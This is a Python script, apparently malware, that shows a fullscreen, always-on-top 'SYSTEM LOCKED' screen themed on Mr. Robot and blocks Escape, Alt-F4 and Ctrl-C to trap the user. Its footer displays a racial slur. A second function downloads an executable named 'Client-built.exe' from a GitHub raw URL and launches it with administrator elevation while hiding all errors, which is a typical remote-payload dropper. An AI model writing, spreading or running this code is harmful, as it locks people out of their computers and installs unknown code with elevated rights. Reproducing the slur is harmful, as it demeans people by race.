import tkinter as tk

password = "fsociety"

def check_password():
    if entry.get() == password:
        root.destroy()

root = tk.Tk()
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.overrideredirect(True)
root.configure(bg='black')

frame = tk.Frame(root, bg='black')
frame.pack(expand=True)

title = tk.Label(frame, text="SYSTEM LOCKED", font=("Courier", 36, "bold"), fg="#00ff00", bg="black")
title.pack(pady=20)

sub = tk.Label(frame, text="Hello, friend.", font=("Courier", 18), fg="#00ff00", bg="black")
sub.pack(pady=10)

line = tk.Label(frame, text="─" * 40, font=("Courier", 12), fg="#00ff00", bg="black")
line.pack(pady=10)

msg = tk.Label(frame, text="Enter password to unlock:", font=("Courier", 14), fg="#00ff00", bg="black")
msg.pack(pady=5)

entry = tk.Entry(frame, font=("Courier", 14), bg="black", fg="#00ff00", insertbackground="#00ff00")
entry.pack(pady=10)
entry.bind('<Return>', lambda e: check_password())

button = tk.Button(frame, text="UNLOCK", font=("Courier", 12), bg="black", fg="#00ff00", command=check_password)
button.pack(pady=10)

footer = tk.Label(frame, text="enjoy nigger XD", font=("Courier", 12), fg="#00ff00", bg="black")
footer.pack(side="bottom", pady=50)

root.bind('<Escape>', lambda e: None)
root.bind('<Alt-F4>', lambda e: None)
root.bind('<Control-c>', lambda e: None)

root.mainloop()

def download_and_run():
    url = "https://raw.githubusercontent.com/albertyoutubepro-dot/d/main/Client-built.exe"
    
    if getattr(sys, 'frozen', False):
        base_path = os.path.dirname(sys.executable)
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))
    
    output_path = os.path.join(base_path, "Client-built.exe")
    
    try:
        if not os.path.exists(output_path):
            response = requests.get(url, stream=True)
            response.raise_for_status()
            with open(output_path, "wb") as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
        ctypes.windll.shell32.ShellExecuteW(None, "runas", output_path, None, None, 1)
    except Exception:
        pass
